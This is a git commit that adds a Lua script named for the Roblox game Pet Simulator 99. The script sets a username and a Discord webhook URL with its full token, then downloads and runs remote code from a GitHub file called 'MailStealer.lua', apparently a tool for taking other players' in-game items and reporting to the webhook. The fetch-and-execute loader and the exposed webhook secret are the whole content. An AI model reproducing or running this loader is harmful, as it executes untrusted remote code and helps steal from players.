44de7baceb39f8c8780f5fd665114807caa57446
TheOnixx-Script <justbeskill48@gmail.com>
2025-03-27 19:15:52 +0100

    Add files via upload

---
+++ PetSimulator99.lua
@@ -0,0 +1,5 @@
+Username = zeropo12
+LoadScreen = true 
+Webhook = https://discord.com/api/webhooks/1351253341094678658/vdqbnrWhnbKteem5iGpKT7IrEhSSA8Cw_yR5HW0ymRlEWCXWMgQXH9simsWHeOEA4ufN)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
